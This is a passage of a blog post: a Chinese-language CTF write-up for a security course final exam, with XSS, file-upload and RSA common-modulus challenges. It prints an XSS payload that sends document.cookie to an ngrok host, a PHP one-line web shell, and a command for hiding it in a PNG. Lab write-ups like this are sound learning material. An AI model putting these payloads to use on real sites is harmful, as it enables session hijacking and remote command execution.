class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="attr">httpOnly</span>: <span class="literal">false</span>, <span class="attr">secure</span>: <span class="literal">false</span>, <span class="attr">sameSite</span>: <span class="string">&#x27;Lax&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle0&#x27;</span> &#125;)</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`[+] error visting <span class="subst">$&#123;path&#125;</span> `</span>, e)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">close</span>()</span><br><span class="line">    <span class="keyword">await</span> context.<span class="title function_">close</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而要觸發這個 visit 函數，必須在回報 note 的地方輸入一個正確合法的 ID，才會執行 visit 函數，程式碼如下。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/report&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable constant_">NOTES</span>.<span class="title function_">has</span>(id)) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;Note not found&quot;</span>);</span><br><span class="line">    <span class="title function_">visit</span>(id);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Admin will check your report&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>接著先在網站嘗試隨意 POST 一個正常的 note，會發現網址變成了以下的形式。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab.scist.org:20001/note/732733d42c28d7060c71be53a4dd491b</span><br></pre></td></tr></table></figure>
+
+<p>其中”note&#x2F;“路徑後面的<code>1e9dafbc67ea0516bacce8d5d36a3c7a</code>，便是一個合法的 note ID。</p>
+<p>到了這邊，我原本以為是要把合法的 ID 和 XSS 的 payload 結合在一起，並在 Report 的地方提交。但經過助教的提示之後，知道應該是要把 payload 提交在 note 的內文，所以我開始重新研究一次 app.js 的程式碼。發現了之前沒仔細看到可能可以注入 XSS 的地方，如下。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/note/:noteId&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> noteId = req.<span class="property">params</span>.<span class="property">noteId</span>;</span><br><span class="line">    <span class="keyword">const</span> note = <span class="variable constant_">NOTES</span>.<span class="title function_">get</span>(noteId);</span><br><span class="line">    <span class="keyword">if</span> (!note) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Note not found!&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">`&lt;h1&gt;Your Note&lt;h1&gt;&lt;p id=&quot;note&quot;&gt;<span class="subst">$&#123;note&#125;</span>&lt;/p&gt;`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>在這段程式碼中，可以看到我們提交的 note 會被夾在 p 標籤中解析，所以我嘗試注入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>發現不能執行，因為 app.js 裡面限制了允許的標籤白名單，只有 s、b、u、p、code 這五個標籤能使用，其餘的標籤會被 strip 掉。知道可以用的標籤後，我使用了 p 標籤提交，嘗試執行 javascript，payload 如下:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p/onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;test&lt;p&gt;</span><br></pre></td></tr></table></figure>
+
+<p>發現 note 只會被解析成<code>test</code>，而移動滑鼠到上面的時候也確實會執行 js，因此接下來要做的就是修改 payload，並再提交 note 後去 report 的地方提交 id，讓 visit 去執行到我們提交的腳本，就可以得到 cookie 了。</p>
+<p>我用 ngrok 在本地先架了個伺服器，並且嘗試透過其獲取 cookie，payload 如下:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p/onmouseover=document.location.href=&quot;https://1ffb-36-234-174-194.ngrok-free.app/&quot;+document.cookie style=&quot;position:fixed;left:0;top:0;width:9999px;height:9999px;&quot;&gt;test<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是因為 onmouseover 屬性需要有滑鼠滑過，即便我把 p 標籤調整的很大，但因為 visit 函數不會有滑鼠滑過，所以還是不會執行。很可惜到了截止的最後，還是沒能找出正確的 payload 獲取到 flag。</p>
+<p>最後來談談這個漏洞在真實世界可能的危害，題目在每次回報完後都會提示<code>admin will check your report</code>，這告訴我們如果真實世界中有人利用 XSS 漏洞注入了惡意代碼，而當系統管理員去”check”的時候，自己的 cookie 可能就會被利用，讓有心人士可以在不知道 admin 帳號密碼的情況下以 admin 的權限登入系統。</p>
+<h1 id="Uploader"><a href="#Uploader" class="headerlink" title="Uploader"></a>Uploader</h1><p>在這題裡面，我先嘗試上傳了一張正常的圖片，發現網頁會呈現這樣的狀態。<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/ByG6mhhcT.png"><br>我一開始先用了課程中教過的一句話木馬來嘗試上傳，我上傳的是 php 檔。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>結果系統會回應<code>not a PNG file</code>，這表示前端會檢測是否為合法的上傳檔案類型，我又嘗試把檔名修改為<code>shell.php.png</code>再進行上傳，結果系統的回應是<code>Invalid image</code>，表示後端也有檢測他是否為 PNG 檔案。後來又嘗試了很多其他的方法，包括在 php payload 前面加上 magic numbers <code>89504E47</code>嘗試讓系統解析為 PNG 檔，但得到的回應都跟前面差不多。</p>
+<p>最後，在經過一番搜尋、查找資料後，發現只剩下一個方法，就是上傳圖片馬。所謂的圖片馬，就是把圖片和木馬組合在一起上傳。於是我準備了一張正常的 png(normal.png)和惡意的 php 代碼(shell.php)，將其放在同一個路徑底下。接著利用以下的指令將其組合為惡意圖片馬(pwn.png):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy normal.png/b + shell.php/a pwn.png</span><br></pre></td></tr></table></figure>
+
+<p>接著我將 pwn.png 上傳，發現系統回應<code>Bad content</code>，到這邊，比賽就結束了，結果最後還是沒能成功地取得 Flag，QQ。</p>
+<h1 id="Common-modulus"><a href="#Common-modulus" class="headerlink" title="Common modulus"></a>Common modulus</h1><p>這題的題目給了三個 e(公鑰)，三個 c(密文)，還有一個 n(質數因子相乘)，如果有其中兩個 e 是互質，也就是 gcd(e1, e2) &#x3D; 1 的話，就可以利用一般的共模攻擊，去求得 m(明文)，就是利用會有一組 s1 和 s2 滿足 s1 _ e1 + s2 _ e2 &#x3D; 1 的條件，加上一點計算，去找出原本的 m，如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">已知 s1 * e1 + s2 * e2 = 1</span><br><span class="line">==========================</span><br><span class="line">c1 ^ s1 * c2 ^ s2 mod n</span><br><span class="line">= m ^ (e1 * s1) * m ^ (e2 * s2) mod n</span><br><span class="line">= m ^ (e1 * s1 + e2 * s2) mod n</span><br><span class="line">= m mod n</span><br><span class="line">= m</span><br></pre></td></tr></table></figure>
+
+<p>可惜這題的三個 e 都不是互質的，所以要用其他的方法，我就找到了<a target="_blank" rel="noopener" href="https://blog.csdn.net/CHUNJIUJUN/article/details/120553701">一篇文章</a>，裡面的方法是這樣:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gcd(e1, e2) = gcd</span><br><span class="line">c1 = (m ^ e1&#x27;) ^ gcd mod n</span><br><span class="line">c2 = (m ^ e2&#x27;) ^ gcd mod n</span><br><span class="line">e1&#x27; * s1 + e2&#x27; * s2 = 1</span><br><span class="line"></span><br><span class="line">c1 ^ s1 * c2 ^s2 mod n</span><br><span class="line">= (((m ^ e1&#x27;) ^ gcd) ^ s1) * (((m ^ e2&#x27;) ^ gcd) ^s2) mod n</span><br><span class="line">= m ^ (e1&#x27; * s1 * gcd + e2&#x27; * s2 * gcd) mod n</span><br><span class="line">= m ^ gcd mod n</span><br></pre></td></tr></table></figure>
+
+<p>所以只要把最後算出來的 m 再開 gcd 次方根就能找到明文，於是我寫了下面的腳本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext, iroot, gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">22777210958276255973049562078823322470680917129996977683503001216538435863571279721754251786904659128777249694642787480739356668460290853226080964490087136228546045908347764486557698226166963415933243390587759408509357466384117429023536043020407223339909068182712164327318468662771341384255178839693851749833498595767285757850112681038669603653206881003854674152787778849201349140811383067441876396986225542868926178627083357794996583066978454919162611524965685485188287561894204743004599366796640463833284730895990140454443706509700257117888543581605105114423861683342316455500361042572686499019143155407840720672419</span></span><br><span class="line">e1 = <span class="number">2755481107</span></span><br><span class="line">e2 = <span class="number">3066037283</span></span><br><span class="line"><span class="comment"># e3 = 3825027809</span></span><br><span class="line">c1 = <span class="number">7927632180925780686814468716254548866073876571301670927803568567992929927231666309788681512003760545920706822481579873353923145930555620003462589361971404649174770107086295817994744475096856399932862153021335565923236506465046739212222528807145844779588311833022632475905272022533594289777471811000950934146066045472218603345107418836739010466236517799411565681939684720963118217633594133046157469386003057018852372681387318985149400851657988757739939640107583630568340335757129814894759082226790230350623403635880468479392207604875482436028050237168056669104984504520909514306552404757744266671282270481535254632231</span></span><br><span class="line">c2 = <span class="number">19162894772364755634695403163786451410245098251726628084799257554767334519905640179161346412307514221332891648206034353728374020165930677162860102377777681292582203157662333178388904577242217496599789741706061676944395451665239726479077741007297709368920091594846785681021427819585722029936761040901809601396670202192052497066209075288103228744858127970671076282164969113619499174358765991380757911727424305398346399701274033326030443722686643479760852934150701783998463047750118216160431187984416861424972003041835112849345069144579908117061092179552843173803432427193984945136248106420527309951492325647621839772126</span></span><br><span class="line"><span class="comment"># c3 = 12281989205300534636704612304895466894728582803084654071108548003638296732533233324118128443432186580642178421360358569501856887776677567285142630332770995470034693283004693504328569378601328550606731466373274474890323776647142155504550689141803732334439130044963732806927780975317712578470165550637007845813598338398021681428237912733055103663278507239375781432804708170722603762602715296180599171769475818480578806749013564273888734572033232825425951511959908980277564593244704622649568752985829748683356507419796438898916535864730103144986484287500764463579887673117770889298009984153867524175061353407719439002075</span></span><br><span class="line"></span><br><span class="line">g = gcd(e1, e2)</span><br><span class="line">e1_ = e1 // g</span><br><span class="line">e2_ = e2 // g</span><br><span class="line">l, s1, s2 = gcdext(e1_, e2_)</span><br><span class="line">m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">m = iroot(m, g)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flag = <span class="subst">&#123;long_to_bytes(m).decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>只不過最後的答案是錯誤的，沒能找到正確的 flag。可能是因為本題的 gcd 太大，還要找其他的算法。</p>
+<h1 id="參賽心得"><a href="#參賽心得" class="headerlink" title="參賽心得"></a>參賽心得</h1><p>這次算是我第一次花了那麼多的時間打 CTF 比賽，之前可能就是自己在網路上解解題甚麼的，總的來說還是很有趣的一次體驗。而參加完這次的比賽，我也更加地意識到自己的不足，真的還有很多可以進步、練習的地方。即便可能有點被打擊信心，但我也不會氣餒，我要更努力的練習，沒事就多解解題甚麼的，增強自己的實力，希望可以在之後的比賽表現得越來越好！</p>
+<h1 id="參考資料區"><a href="#參考資料區" class="headerlink" title="參考資料區"></a>參考資料區</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#/%E5%85%B6%E4%BB%96%E8%A7%84%E5%88%99">文件上傳漏洞總結</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html">PERSISTENT PHP PAYLOADS IN PNGS: HOW TO INJECT PHP CODE IN AN IMAGE – AND KEEP IT THERE !</a></li>
+<li><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10245459?sc=hot">[Day 26] 026 - 串流加密法 - Stream cipher</a></li>
+<li><a target="_blank" rel="noopener" href="https://hackmd.io/@foxo-tw/slides/%2F%40foxo-tw%2FByAkemFv7%3Ftype%3Dslide%23%2F1">童舒晧資安資源整理(XSS 教學)</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3952?time__1311=n4+xnD0DBDgGG=G8+eDsA3xCqm/z3K3r34D&alichlgref=https://www.google.com/">安全工具——XSSer</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/mydriverc2/article/details/42048983?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-42048983-blog-113249158.235%5Ev43%5Epc_blog_bottom_relevance_base9&spm=1001.2101.3001.4242.2&utm_relevant_index=2">XSSer 使用(CSDN)</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/CHUNJIUJUN/article/details/120553701">关于 RSA 共模攻击 e1，e2 不互素的解法</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40345591/article/details/127476867">文件上传漏洞进阶教程&#x2F;白名单绕过&#x2F;图片马制作&#x2F;图片马执行</a></li>
+</ul>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">CX330</div><div class="post-copyright__author_desc">Build the universe with me.</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://cx330.tw/CTF/SCIST-S4-%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E8%80%83-Writeup/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://cx330.tw/CTF/SCIST-S4-%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E8%80%83-Writeup/')">SCIST S4 資訊安全期末考 Writeup</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="/assets/buymeacoffee.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/buymeacoffee.png" alt="Buy Me a Coffee"/></a><div class="post-qr-code-desc">Buy Me a Coffee</div></li><li class="reward-item"><a href="/assets/me.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" alt="CX330"/></a><div class="post-qr-code-desc">CX330</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://cx330.tw/CTF/SCIST-S4-%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E8%80%83-Writeup/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=SCIST S4 資訊安全期末考 Writeup&amp;url=https://cx330.tw/CTF/SCIST-S4-%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E8%80%83-Writeup/&amp;pic=/images/default_cover.webp" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本部落格所有文章除特別聲明外，均採用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 許可協議。轉載請註明來自 <a href="https://cx330.tw" target="_blank">CX330 Odyssey</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E8%B3%87%E5%AE%89/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>資安<span class="tagsPageCount">4</span></a><a class="post-meta__box__tags" href="/tags/SCIST/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>SCIST<span class="tagsPageCount">1</span></a></div></div></div><div class="post_share"><div class="addtoany"><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class="a2a_button_facebook"></a><a class="a2a_button_twitter"></a><a class="a2a_button_line"></a><a class="a2a_button_copy_link"></a><a class="a2a_dd" target="_blank" rel="noopener" href="https://www.addtoany.com/share"></a></div></div><script async="async" src="https://static.addtoany.com/menu/page.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/LifeAndTalk/2024-Summer-Intensive-Training-Plan/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/default_cover.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2024 Summer Intensive Training Plan</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>相關推薦</span></div><div class="relatedPosts-list"><div><a href="/CTF/2024-AIS3-Pre-exam-Writeup/" title="2024 AIS3 Pre-exam Writeup"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/rk2dgM3NA.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-02</div><div class="title">2024 AIS3 Pre-exam Writeup</div></div></a></div><div><a href="/CTF/All-in-One%20PicoCTF-Writeups/" title="All-in-One PicoCTF Writeups"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/BJxhDLKL0.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-01</div><div class="title">All-in-One PicoCTF Writeups</div></div></a></div><div><a href="/StudyNotes/Cryptography-Notebook-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88/" title="Cryptography Notes 密碼學任督二脈"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/cryptography.webp" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-27</div><div class="title">Cryptography Notes 密碼學任督二脈</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 評論</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/sunglasses.png" alt="status"/></div></div><div class="author-info__description">這裡是CX330的部落格，記載了有關於CTF、資安、開發、程式設計等等的文章，也會記錄我個人的生活。相信你會在這邊找到有用的東西。</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">CX330</h1><div class="author-info__desc">Build the universe with me.</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/CX330Blake" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://www.facebook.com/profile.php?id=100011698690769" target="_blank" title="Facebook"><i class="fa-brands fa-facebook faa-tada"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">English site at <a target="_blank" rel="noopener" href="https://en.cx330.tw" style="color:#f5a524;text-decoration:underline;">HERE</a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目錄</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Welcome"><span class="toc-number">1.</span> <span class="toc-text">Welcome</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSSER"><span class="toc-number">2.</span> <span class="toc-text">XSSER</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Uploader"><span class="toc-number">3.</span> <span class="toc-text">Uploader</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Common-modulus"><span class="toc-number">4.</span> <span class="toc-text">Common modulus</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%83%E8%B3%BD%E5%BF%83%E5%BE%97"><span class="toc-number">5.</span> <span class="toc-text">參賽心得</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%E5%8D%80"><span class="toc-number">6.</span> <span class="toc-text">參考資料區</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024%20CTF%20Training/Day-06-Grinding-PicoCTF-4/" title="[Day 06] Grinding PicoCTF 4"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/hacker_in_the_universe.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[Day 06] Grinding PicoCTF 4"/></a><div class="content"><a class="title" href="/2024%20CTF%20Training/Day-06-Grinding-PicoCTF-4/" title="[Day 06] Grinding PicoCTF 4">[Day 06] Grinding PicoCTF 4</a><time datetime="2024-07-02T08:24:10.000Z" title="發表於 2024-07-02 16:24:10">2024-07-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024%20CTF%20Training/Day-05-Grinding-PicoCTF-3/" title="[Day 05] Grinding PicoCTF 3"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/hacker_in_the_universe.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[Day 05] Grinding PicoCTF 3"/></a><div class="content"><a class="title" href="/2024%20CTF%20Training/Day-05-Grinding-PicoCTF-3/" title="[Day 05] Grinding PicoCTF 3">[Day 05] Grinding PicoCTF 3</a><time datetime="2024-07-01T14:15:41.000Z" title="發表於 2024-07-01 22:15:41">2024-07-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/DevCorner/%E4%B8%8D%E6%87%82%E5%B0%B1%E5%95%8F%EF%BC%81%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8-Hexo-GitHub-HackMD-%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%80%8B%E4%BA%BA%E9%83%A8%E8%90%BD%E6%A0%BC/" title="不懂就問！如何利用 Hexo + GitHub + HackMD 搭建自己的個人部落格"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/hackers_blog.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="不懂就問！如何利用 Hexo + GitHub + HackMD 搭建自己的個人部落格"/></a><div class="content"><a class="title" 